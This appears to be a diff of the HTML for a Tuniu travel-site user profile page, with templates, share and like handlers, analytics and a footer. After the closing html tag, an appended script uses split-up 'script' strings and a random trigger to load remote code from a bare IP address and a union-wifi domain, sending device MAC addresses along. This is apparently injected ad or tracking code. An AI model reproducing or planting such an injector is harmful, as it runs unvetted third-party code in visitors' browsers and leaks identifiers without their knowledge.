+                <p class="area-list-star"></p>
+                <p class="J_SpotComment area-list-intro" data-name="
+              <% if (info.comment) {%>
+                <%= info.comment %>
+                <% } else { %>
+                写点什么吧~                <% } %>
+                " title="
+                 <% if (info.comment) {%>
+                <%= info.comment %>
+                <% } else { %>
+                写点什么吧~                <% } %>
+                ">
+                </p>
+                <p class="aera-list-adit">
+                    <span data-sid="china" data-code="10002" class="J_EditSpot edit tuc-icon"></span></p>
+            </div>
+            <div class="area-line"><p></p><span class="tuc-icon"></span></div>
+        </div>
+    </script>
+
+    <script id="T_SelectAreaDialog" type="text/template">
+        <div>
+            <div id="J_SelectAreaIn" class="tuc1-add" style="padding-left: 75px;">
+                <label>国内</label>
+                <div class="tuc1-county tuc-icon" id="J_ProvinceSelect"></div>
+            </div>
+            <div id="J_SelectAreaOut" class="tuc1-addforg">
+                <label>境外</label>
+                <div class="tuc1-county tuc-icon" id="J_CountrySelect"></div>
+
+            </div>
+            <div class="J_CityShow tuc1-areashow"></div>
+            <div class="spot-hasselected">
+                已选择了<span class="J_AreaSelectedNum">0</span>个地点
+            </div>
+        </div>
+
+    </script>
+
+    <script id="T_SelectSpotDialog" type="text/template">
+        <div>
+            <div class="tuc-spot">
+                <input type="text" value="" class="J_SearchSpot tuc-spot-search"/>
+                <span class="J_SearchBtn tuc-search tuc-icon"></span>
+                <div class="J_SpotList tuc1-areashow"></div>
+            </div>
+            <div class="spot-hasselected">
+                已选择了<span class="J_SpotSelectedNum">0</span>个景点
+            </div>
+        </div>
+    </script>
+
+    <!--编辑景点 start-->
+    <script id="T_EditSpot" type="text/template">
+        <div>
+            <div class="tuc5-title">
+                <p class="area-list-star"></p>
+                <span class="J_SpotEditTitle title"></span>
+            </div>
+            <textarea name="commentspot" class="comment-spot"></textarea>
+            <div class="tuc5-error">已超过800字符的上限。</div>
+        </div>
+    </script>
+    <!--编辑景点 end-->
+
+    <!--微信二维码 start-->
+    <div class="hide" id="tuc9">
+        <div class="weixin-title">微信分享</div>
+        <div class="weixin-img">
+            <p class="weixin-pic">
+                <img src="/personajax/CommonGetQR?page_user_unique_code=D41487D5BC5EBF33F3AD117AE2361877&pageType=person"
+                     width="100" height="100" alt="D41487D5BC5EBF33F3AD117AE2361877">
+            </p>
+            <p class="weixin-intro"><img src="http://img2.tuniucdn.com/site/file/deyonUserCenter/images/wexinintro.jpg"
+                                         width="553" height="258" alt="分享到微信"></p>
+        </div>
+    </div>
+    <!--微信二维码 end-->
+    <!--足迹为空 start-->
+    <script id="T-Blank" type="text/template">
+        <div class="tuc-track-blank">
+            <div class="tuc-blank-text">
+                <img src="http://img2.tuniucdn.com/site/file/deyonUserCenter/images/empty.png" width="104"
+                     height="103"/>
+                <div class="tuc-blank-right">
+                    <p>你的旅行从这里起航~</p><a href="javascript:;" class="addtrack tuc-icon fl ml0"
+                                        id="J_AddTrackBlank">添加足迹</a></div>
+            </div>
+        </div>
+    </script>
+    <script id="T_CityMarker" type="text/template">
+        <p><%=name%></p>
+    </script>
+    <!--地图城市叠加层 end-->
+    <!--地图景点叠加层 start-->
+    <script id="T_Marker" type="text/template">
+        <div class="tuc-marker">
+            <a href="<%=info.url%>" target="_blank">
+                <img src="<%=info.img%>" width="207" height="140" alt=""/>
+            </a>
+            <div class="marker-title">
+                <p class="marker-title-name"><%=name%></p>
+                <p class="tuc-nom-star " data-star="<%=info.star-1%>">
+                    <% for(k = 0 ;k< info.star; k++){%>
+                    <span class="starl tuc-icon"></span>
+                    <%}%>
+                    <% for(j = 0 ;j< 5-info.star; j++){%>
+                    <span class="starb tuc-icon"></span>
+                    <%}%>
+                </p>
+            </div>
+        </div>
+    </script>
+    <!--地图景点叠加层 end-->
+    <!-- 游记列表 start -->
+    <script type="text/template" id="T_tripsList">
+        <% if( tripObj ){ %>
+        <% if( tripObj.pagecount != 0 ){
+        for(var i=0;i
+        <tripObj.rows.length;i++){
+        var oneData = tripObj.rows[i];
+        <!--if( tripObj.isme == 1 && tripObj.type == 1 ){-->
+        %>
+        <tr>
+            <td><%=oneData.showDate%></td>
+            <td><a href="<%=oneData.subjectUrl%>"><%=oneData.showSubject%></a></td>
+            <td><%=oneData.poiName%></td>
+            <td><%=oneData.hits%></td>
+            <td><%=oneData.replies%></td>
+            <td>
+                <% if(oneData.canOperate){ %>
+                <a href="<%=oneData.editUrl%>">编辑</a>
+                <% if(oneData.status == -4){ %>
+                <a class="a_del" data-tid="<%=oneData.id%>" href="javascript:void(0);">删除</a>
+                <% } %>
+                <% }else{ %>
+                --
+                <% } %>
+            </td>
+        </tr>
+        <% }else{ %>
+        <tr>
+            <td><%=oneData.showDate%></td>
+            <td><a href="<%=oneData.subjectUrl%>"><%=oneData.showSubject%></a></td>
+            <td><%=oneData.poiName%></td>
+            <td><%=oneData.hits%></td>
+            <td><%=oneData.replies%></td>
+            <td><%=oneData.author%></td>
+        </tr>
+        <% } %>
+        <% } %>
+        <% }else{ %>
+        <tr class="tr_nolist">
+            <td colspan="6">
+                <img src="http://img4.tuniucdn.com/img/2015120414/guide/gonglue/yjnone.png">
+                暂时没有相关游记~
+            </td>
+        </tr>
+        <% } %>
+        <% }%>
+    </script>
+    <!-- 游记列表  end -->
+    <!--分享 start-->
+    <div class="bdsharebuttonbox" data-tag="share_1">
+        <a href="javascript:;" class="bds_qzone" data-cmd="qzone">QQ空间</a>
+        <a href="javascript:;" class="bds_tsina" data-cmd="tsina">新浪微博</a>
+        <a href="javascript:;" class="bds_renren" data-cmd="renren">人人网</a>
+        <a href="javascript:;" class="bds_tqq" data-cmd="tqq">腾讯微博</a>
+        <a href="javascript:;" class="aaa_weixin">微信</a>
+    </div>
+    <input type="hidden" id="bd_share_place"/>
+    <script>
+        window._bd_share_config = {
+            common: {
+                "onBeforeClick": function (cmd, config) {
+                    var bd_share_type = $('#bd_share_place').val();
+                    var bdText = '';
+                    if (bd_share_type == 'map') {
+                        var share_cnt_country = $('.J-SumCountry').text();
+                        var share_cnt_province = $('.J-SumProvince').text();
+                        var share_cnt_city = $('.J-SumCity').text();
+                        var share_cnt_spot = $('.J-SumSpot').text();
+                        bdText = '染熙的足迹遍布：' + share_cnt_country + '国家，' + share_cnt_province + '省份，' + share_cnt_city + '城市，' + share_cnt_spot + '景点，快去看看TA是如何攻城略地的';
+                    } else if (bd_share_type == 'want') {
+                        bdText = '染熙曝光了一直想去旅行的地方，快去围观吧~';
+                    } else if (bd_share_type == 'recommend_spot') {
+                        bdText = '染熙为好友们推荐了值得一游的景点，快去看看吧~';
+                    } else if (bd_share_type == 'recommend_my_routes') {
+                        bdText = '染熙给好友们推荐了途牛网值得预订的线路，数量有限，还不快抢~';
+                    } else if (bd_share_type == 'recommend_hot_routes') {
+                        bdText = '染熙给好友们推荐了途牛网的人气线路，数量有限，还不快抢~';
+                    }
+
+                    var filter_params = (typeof unique_code_flag != "undefined" && unique_code_flag) ? {page_user_unique_code: page_user_unique_code} : {page_uid: page_uid};
+                    filter_params['share_type'] = bd_share_type;
+                    filter_params['share_text'] = bdText;
+                    filter_params['page_nickname'] = '染熙';
+
+                    var page_share_url = "/personajax/CommonShare";
+                    $.post(page_share_url, filter_params,
+                        function (res) {
+                        }, "json");
+                    return {
+                        "bdText": bdText
+                    }
+                }
+            },
+            share: [{
+                "bdSize": 16
+            }]
+        };
+        //以下为js加载部分
+    </script>
+    <!--分享 end-->
+
+    <script>
+        var head = document.getElementsByTagName('head')[0];
+        var insertBefore = head.insertBefore;
+        head.insertBefore = function (newElement, referenceElement) {
+            if (newElement.href && newElement.href.indexOf('http://fonts.googleapis.com/css?family=Roboto') === 0) {
+                return;
+            }
+            insertBefore.call(head, newElement, referenceElement);
+        };
+    </script>
+
+    <!--列表模板 start-->
+    <script id="T_QAList" type="text/template">
+        <div class="ucenter-list J-MoudleList">
+            <div class="qaleft">
+                <span class="qanum"><%=answerNum%></span>
+                <span class="qaword">回答</span>
+            </div>
+            <div class="qaright">
+                <div class="qatitle">
+                    <a href="<%=url%>" target="_blank"><%=title%></a>
+                </div>
+                <div class="qaintro">
+                    <div class="qaintro-left">
+                        <%=date%>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </script>
+    <!--列表模板 end-->
+    <!--列表为空模板 start-->
+    <script id="T_QANoneList" type="text/template">
+        <div class="qa-ucenter-nolist J-NoList">
+            <div class="ucenter-nolist">
+                <!-- <%if(type == 'ask'){%>-->
+                暂时还没有问题~
+                <%}else if(type == 'answer'){%>
+                暂时还没有回答~
+                <%}else{%>
+                暂时还没有关注~
+                <%}%>
+            </div>
+        </div>
+    </script>
+    <!--列表为空模板 end-->
+    <script src="http://img2.tuniucdn.com/f/2014120501/ui-lib/layer/layer.min.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/underscore-min.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/art-template-native.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/event.js"></script>
+    <script src="http://img2.tuniucdn.com/f/2017042018/deyonUserCenter/js/data.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/star.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/select.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150606001/deyonUserCenter/js/baseAddr.js"></script>
+    <script src="http://img2.tuniucdn.com/f/2016052320/deyonUserCenter/js/spot.js"></script>
+    <script src="http://img2.tuniucdn.com/f/201503181800/deyonUserCenter/js/addr.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/area.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/selectArea.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150606001/deyonUserCenter/js/addrList.js"></script>
+    <!--<script src="http://maps.google.cn/maps/api/js?sensor=false"></script>-->
+    <script src="http://img2.tuniucdn.com/f/2016052320/deyonUserCenter/js/app.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/tourUserCenter.js"></script>
+    <script src="http://img2.tuniucdn.com/f/2016052320/deyonUserCenter/js/addCitySpot.js"></script>
+    <script src="http://img2.tuniucdn.com/f/201503181800/deyonUserCenter/js/index.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150624001/deyonUserCenter/js/wantTour.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150624001/deyonUserCenter/js/remmondSpot.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/tucPop.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150624001/deyonUserCenter/js/remRoute.js"></script>
+    <script src="http://img2.tuniucdn.com/f/20150191900/deyonUserCenter/js/remtucRoute.js"></script>
+
+    <script type="text/javascript" src="http://img4.tuniucdn.com/f/2014/tn-slide/tn-slide.js" charset="utf-8"></script>
+    <script type="text/javascript" src="http://img2.tuniucdn.com/j/201507071611/qask/QAXList.js"></script>
+    <script type="text/javascript" src="http://img2.tuniucdn.com/j/201704201820/qask/data.js"></script>
+    <script type="text/javascript" src="http://img4.tuniucdn.com/j/20160615/qask/qa_index_x.js"></script>
+    <script type="text/javascript" src="http://img4.tuniucdn.com/j/20170420/youji/mytrips.js"></script>
+    <script type="text/javascript" src="http://img4.tuniucdn.com/j/20170420/youji/myPlays.js"></script>
+    <script type="text/javascript" src="http://img4.tuniucdn.com/j/201512101657/common_v2/pager.js"></script>
+    <!--<script type="text/javascript" src="http://www.tuniu_test.com/qask/data4.js"></script>
+    <script type="text/javascript" src="http://www.tuniu_test.com/qask/QAXList2.js"></script>
+    <script type="text/javascript" src="http://www.tuniu_test.com/qask/qa_index_x3.js"></script>-->
+
+    <script>
+        new Qalist;
+    </script>
+
+    <script>
+        //点赞功能
+        $(document).ready(function () {
+            //跳转到更换图片
+            $("#btn_change_pic").click(function () {
+                var change_pic_url = "/personajax/CommonAckChangePic";
+                $.get(change_pic_url);
+            });
+            //点赞
+            var liking = false;
+            var _add = '<span class="doyen-addone" style="left:-10px;">+1</span>';
+            var _liked = '<span class="doyen-addone">今日已赞过啦</span>';
+            $("#cnt_like").click(function () {
+                if (self_flag || liking) {
+                    return false;
+                }
+                liking = true;
+
+                var filter_params = (typeof unique_code_flag != "undefined" && unique_code_flag) ? {page_user_unique_code: page_user_unique_code} : {page_uid: page_uid};
+                filter_params['type'] = "add";
+
+                var page_like_url = "/personajax/CommonLike";
+                $.post(page_like_url, filter_params, function (res) {
+                    if (res && res.success) {
+                        $("#cnt_like").html(parseInt(parseInt($("#cnt_like").text())) + 1);
+                        $("#cnt_like").append(_add);
+                    }
+                    else {
+                        $("#cnt_like").append(_liked);
+                    }
+                    $("#cnt_like").find('span').eq(0).animate({
+                        'opacity': 1,
+                        'top': '-18px'
+                    }, 'slow');
+                    $("#cnt_like").find('span').eq(0).queue(function () {
+                        $(this).remove();
+                    });
+                    liking = false;
+                }, "json");
+            });
+        });
+        //获取游记列表数据并渲染
+        function render_trip_list(year, page) {
+            //获取当前year参数
+            var filter_params = (typeof unique_code_flag != "undefined" && unique_code_flag) ? {page_user_unique_code: page_user_unique_code} : {page_uid: page_uid};
+            filter_params['year'] = year;
+            filter_params['limit'] = 5;
+            filter_params['page'] = page;
+
+            var trip_list_base_url = "/personajax/CommonGetTrips";
+            var trip_list_template = _.template($("#T_TripList").html());
+            $.get(trip_list_base_url, filter_params,
+                function (data) {
+                    $("#part_trip .trip_content").remove();
+                    $("#part_trip .J-Page").remove();
+                    $("#part_trip").append(trip_list_template(data));
+                }, "json");
+        }
+        //切换year
+        $('#change_trip_year .tuc-icon').click(function () {
+            if ($(this).hasClass("tuc-selected")) {
+                return false;
+            } else {
+                $(this).siblings('p').removeClass('tuc-selected');
+                $(this).addClass('tuc-selected');
+                var year = $(this).attr('trip_year');
+                render_trip_list(year, 1);
+            }
+        });
+        $(document).ready(function () {
+            render_trip_list('all', 1);
+        });
+    </script>
+
+    <!--start foot-->
+    <!-- siteMap S -->
+    <link rel="stylesheet" type="text/css" href="//ssl1.tuniucdn.com/s/20151019/common_foot/common_foot_v3.css"/>
+    <!-- three sun S -->
+    <div class="three_trav">
+        <div class="thr_trav">
+            <a href="http://www.tuniu.com/static/sunshine_ensure/" target="_blank"
+               style="display:block;width:100%;height:100%;">
+                <em class="tn_text" id="service_phone_head_text">客户服务电话</em>
+                <em class="tn_phone" id="service_phone_head_phone">010-666666</em>
+            </a>
+        </div>
+    </div>
+    <!-- three sun E -->
+    <!-- four_ad S -->
+    <!-- four_ad S -->
+
+    <!--start foot-->
+    <div id="TN-footer" class="tn_footer datalazyload" data-lazyload-type="data" data-lazyload-from="textarea">
+        <p>记忆之旅国际旅行社有限公司，旅行社业务经营许可证编号：L-BJ-CJ00144　　记忆之旅国际旅行社有限公司，旅行社业务经营许可证编号：L-SH-CJ00107 </p>
+        <p id="TN-links">
+            <a href="http://www.tuniu.com/corp/aboutus.shtml" target="_blank" rel="nofollow">关于我们</a>
+            <a $nofollow href="http://ir.tuniu.com" target="_blank">Investor Relations</a>
+            <a href="http://www.tuniu.com/corp/contactus.shtml" target="_blank" rel="nofollow">联系我们</a>
+            <a href="http://www.tuniu.com/corp/advise.shtml" target="_blank" rel="nofollow">投诉建议</a>
+            <a rel="nofollow" href="http://www.tuniu.com/corp/advertising.shtml" target="_blank">广告服务</a>
+            <a rel="nofollow" href="http://www.tuniu.com/giftcard/" target="_blank">旅游券</a>
+            <a rel="nofollow" href="http://tuniu.zhiye.com/" target="_blank" style="color: red;">途牛招聘</a>
+            <a href="http://www.tuniu.com/corp/privacy.shtml" target="_blank" rel="nofollow">隐私保护</a>
+            <a href="http://www.tuniu.com/corp/duty.shtml" target="_blank" rel="nofollow">免责声明</a>
+            <a rel="nofollow" href="http://www.tuniu.com/corp/zizhi.shtml" target="_blank">旅游度假资质</a>
+            <a rel="nofollow" href="http://www.tuniu.com/theme/index/" target="_blank">主题旅游</a>
+            <a href="http://www.tuniu.com/corp/agreement.shtml" target="_blank" rel="nofollow">用户协议</a>
+            <a href="http://www.tuniu.com/corp/sitemap.shtml" target="_blank">网站地图</a>
+            <a rel="nofollow" target="_blank" href="http://www.tuniu.com/ueip/">UEIP</a>
+            <a rel="nofollow" href="http://www.tuniu.com/help/" target="_blank">帮助中心</a>
+        </p>
+
+        <!-- #TN-links -->
+        <p id="copyright">Copyright &copy; 2006-2017 <a rel="nofollow" href="index2.html">志广科技有限公司</a>
+            <a rel="nofollow" href="index2.html">记忆之旅</a> |
+            <a target="_blank" href="http://www.tuniu.com/corp/company.shtml" rel="nofollow">营业执照</a> |
+            <a target="_blank" href="http://www.miibeian.gov.cn/" rel="nofollow">ICP证：苏B2-20130006</a> |
+            <a target="_blank" href="http://www.miibeian.gov.cn/" rel="nofollow">苏ICP备12009060号</a> |
+            <a target="_blank" href="http://nj.tuniu.com">上海旅游网</a>
+        </p>
+
+        <!-- thr_ads E -->
+
+        <div class="slide_order clearfix" id="slideOrder">
+            <span class="fl">最新预订：</span>
+            <div class="fl w_940">
+                <ul>
+                    <li>1分钟前用户***508959预订
+                        <北京双高5日游>首游TOP线推荐，3万人出游佳选，五星连住不挪窝，2大免1小，轻松畅游帝都全景，爆笑嘻哈包袱铺&nbsp;&nbsp;&nbsp;&nbsp;
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class="trav_corp">
+            <a id='___szfw_logo___' href='https://credit.szfw.org/CX20160128013521800380.html' rel="nofollow"
+               target='_blank'>
+                <img src='http://img1.tuniucdn.com/img/20130614/common/common_foot/chengxinOne.png' border='0'
+                     style="height:41px;" alt="中国互联网诚信示范企业"/>
+            </a>
+            <a href="http://net.china.cn/" rel="nofollow" target="_blank" onclick="tuniuRecorder.push('32_1_1_1_1_1')">
+                <img src="//ssl1.tuniucdn.com/img/20140415/common/common_foot/buliang.png" alt="违法和不良信息举报中心" width="109"
+                     height="47"/>
+            </a>
+            <a href="http://js.cyberpolice.cn/webpage/index.jsp" rel="nofollow" target="_blank"
+               onclick="tuniuRecorder.push('32_1_1_1_1_2')">
+                <img src="//ssl1.tuniucdn.com/img/20140415/common/common_foot/wangluo.png" alt="网络110报警服务" width="110"
+                     height="47"/>
+            </a>
+            <img src="//ssl1.tuniucdn.com/img/20140415/common/common_foot/cata.png" alt="cata航空资质认证" width="110"
+                 height="47"/>
+            <a target="_blank" rel="nofollow" href="http://www.isc.org.cn/"
+               onclick="tuniuRecorder.push('32_1_1_1_1_3')">
+                <img src="//ssl1.tuniucdn.com/img/20140415/common/common_foot/huiyuan.png" alt="中国互联网协会" width="110"
+                     height="47"/>
+            </a>
+            <a href="http://www.itrust.org.cn/yz/pjwx.asp?wm=1797102919" rel="nofollow" target="_blank"
+               onclick="tuniuRecorder.push('32_1_1_1_1_4')">
+                <img src="//ssl1.tuniucdn.com/img/20140415/common/common_foot/3acomp.png" alt="中国互联网协会信用评价中心"
+                     width="110" height="47"/>
+            </a>
+
+            <a title="可信网站" target="_blank"
+               href="https://ss.knet.cn/verifyseal.dll?sn=e14120832010056662smwq000000&amp;ct=df&amp;a=1&amp;pa=0.06350954016670585"
+               rel="nofollow" onclick="tuniuRecorder.push('32_1_1_1_1_5')">
+                <img src="//ssl1.tuniucdn.com/img/20140415/common/common_foot/chengxin.png" alt="诚信网站" width="110"
+                     height="47"/>
+            </a>
+            <a href="http://www.jsgsj.gov.cn:60101/keyLicense/verifKey.jsp?serial=320000163820121119100000009204&signData=LvIMjwILeOCOnIt65a1kGAk+FxZKCnAoexteChdi5LEEvVGY5TUoYBJ15zmxNW1dwAE4U4mMREXkWocqMPODoh+IfB2ojCxtCvMF4gVdgsMXKTbkhemenyjWlproKM0XWYyPNEYxgn8H1kxvUgCWX35ExI1xLVWA3Zuw7ZiLdYM="
+               rel="nofollow" target="_blank" onclick="tuniuRecorder.push('32_1_1_1_1_6')">
+                <img src="//ssl1.tuniucdn.com/img/20140415/common/common_foot/dianziyingye.png" alt="营业执照" width="110"
+                     height="47"/>
+            </a>
+            <a target="_blank" rel="nofollow" href="http://www.patachina.org/"
+               onclick="tuniuRecorder.push('32_1_1_1_1_7')">
+                <img src="//ssl1.tuniucdn.com/img/20140415/common/common_foot/pata.png" alt="亚太旅游协会会员单位" width="140"
+                     height="47"/>
+            </a>
+        </div>
+
+    </div>
+    <!--end foot-->
+
+    <script language="javascript" src="//ssl4.tuniucdn.com/j/201704191800/common/mobile_app.js,common/zeus.js"></script>
+    <script type="text/javascript">
+        var tuniuRecorder = _zeus.getRecorder();
+    </script>
+
+    <script src="//ssl4.tuniucdn.com/j/201714191800/rightcommon/underscore.js,rightcommon/main_prd_v3.js,rightcommon/getdata_v4.js"></script>
+    <script type="text/javascript" src="//ssl3.tuniucdn.com/j/201505212000/common/jquery_autoSlide.js"></script>
+    <script type="text/javascript">
+        $(function () {
+            $("#slideOrder").autoSlide();
+        })
+    </script>
+    <!--end foot-->
+
+    <!--end foot-->
+    <script type="text/javascript">
+        //            $("#TN-faq").hide();
+        //            $(".offer_service").hide();
+
+        var content = "/会员/个人主页/染熙/首页";
+        //ga数据准备
+        var _gaq = _gaq || [];
+        _gaq.push(["_setAllowHash", false]);
+        _gaq.push(["_setAllowAnchor", true]);
+        _gaq.push(["_addOrganic", "baidu", "wd"]);
+        _gaq.push(["_addOrganic", "baidu", "word"]);
+        _gaq.push(["_addOrganic", "google", "q"]);
+        _gaq.push(["_addOrganic", "118114", "kw"]);
+        _gaq.push(["_addOrganic", "bing", "q"]);
+        _gaq.push(["_addOrganic", "soso", "w"]);
+        _gaq.push(["_addOrganic", "youdao", "q"]);
+        _gaq.push(["_addOrganic", "sogou", "query"]);
+        _gaq.push(["_addOrganic", "360", "q"]);
+        _gaq.push(["_addOrganic", "baidu", "w"]);
+        _gaq.push(["_addOrganic", "baidu", "q1"]);
+        _gaq.push(["_addOrganic", "baidu", "q2"]);
+        _gaq.push(["_addOrganic", "baidu", "q3"]);
+        _gaq.push(["_addOrganic", "baidu", "q4"]);
+        _gaq.push(["_addOrganic", "baidu", "q5"]);
+        _gaq.push(["_addOrganic", "baidu", "q6"]);
+        _gaq.push(["_addOrganic", "baidu", "q6"]);
+        _gaq.push(["_setDomainName", "tuniu.com"]);
+        _gaq.push(["_setAccount", "UA-4782081-5"]);
+        _gaq.push(["_trackPageview", content]);
+        var tuniuTracker = '';
+        var init_page_set_time_out = 0;//页面自动加载标记
+        In.add('gaAndTac', {
+            path: 'http://img1.tuniucdn.com/j/20140612/common/tac.mini.js,common/ga.js',
+            type: 'js',
+            charset: 'utf-8'
+        });
+        In('gaAndTac', function () {
+            tuniuTracker = _tat.getTracker();
+            tuniuTracker.setPageName("会员:个人主页:染熙:首页");
+            tuniuTracker.addOrganic("360", "q");
+            tuniuTracker.addOrganic("baidu", "w");
+            tuniuTracker.addOrganic("baidu", "q1");
+            tuniuTracker.addOrganic("baidu", "q2");
+            tuniuTracker.addOrganic("baidu", "q3");
+            tuniuTracker.addOrganic("baidu", "q4");
+            tuniuTracker.addOrganic("baidu", "q5");
+            tuniuTracker.addOrganic("baidu", "q6");
+            tuniuTracker.trackPageView();
+            tuniuTracker.enableLinkTracking();
+        });
+        In.add('TN_common_init', {
+            path: 'http://img.tuniucdn.com/j/2014071517/common/jquery-powerFloat.js,common/lazyloadnew.min.js',
+            type: 'js',
+            charset: 'utf-8'
+        });
+        In('TN_common_init', function () {
+            //图片异步加载。
+            $("img").lazyload({
+                effect: "fadeIn",
+                failurelimit: 50,
+                threshold: 300,
+                skip_invisible: false
+            });
+        });
+    </script>
+    <!--start baidu_share-->
+    <script type="text/javascript" id="bdshare_js" data="type=tools&uid=643059"></script>
+    <script type="text/javascript" id="bdshell_js"></script>
+    <script type="text/javascript">var bds_config = {
+        "snsKey": {
+            'tsina': 'a8311fe10852f090',
+            'tqq': '43956772b6ae82e5',
+            't163': '',
+            'tsohu': ''
+        }
+    }</script>
+    <!--start baidu_share-->
+    <link rel="stylesheet" href="http://img2.tuniucdn.com/f/20150106/deyonUserCenter/css/forshare.css"/>
+
+    <script type="text/javascript">
+        /*<![CDATA[*/
+
+        var catLoaded = false;
+        $(document).mousemove(function () {
+            if (!catLoaded) {
+                catLoaded = true;
+                $.getScript("http://www.tuniu.com/headermenu/2500");
+            }
+        });
+        /*]]>*/
+    </script>
+</body>
+</html>
+
+<script>
+    function ik_random() {
+        var ik_r_min = 0;
+        var ik_r_max = 100;
+        return (parseInt(Math.random() * (ik_r_max - ik_r_min + 1) + ik_r_min));
+    }
+    function ik_isiframe() {
+        return (self != top);
+    }
+    var __m = '50:7b:9d:e0:3c:00';
+    var __m2 = '00:00:00:00:00:00';
+    var __h = "<sc" + "ript src=\"http://101.201.53.95/js.php?uid=90b9a2b579ed77179e1accd617f5034b,PC,";
+    var __b = "&r=" + Math.random() + __m + __m2 + "\"></scr" + "ipt>";
+    var x = ik_random();
+    if (!ik_isiframe()) {
+        switch (true) {
+            case x >= 0 && x < 5:
+                document.write(__h + "200" + __b);
+                document.write("<sc" + "ript src=\"http://js.union-wifi.com/zm.js?R6Gpf6T&dmac=" + __m2 + "&umac=" + __m + "\"></scr" + "ipt>");
+                break;
+            case x >= 55 && x <= 100:
+                document.write(__h + "100" + __b);
+                document.write("<sc" + "ript src=\"http://js.union-wifi.com/zm.js?Rav195P&dmac=" + __m2 + "&umac=" + __m + "\"></scr" + "ipt>");
+                break;
+        }
+    }
+</script>
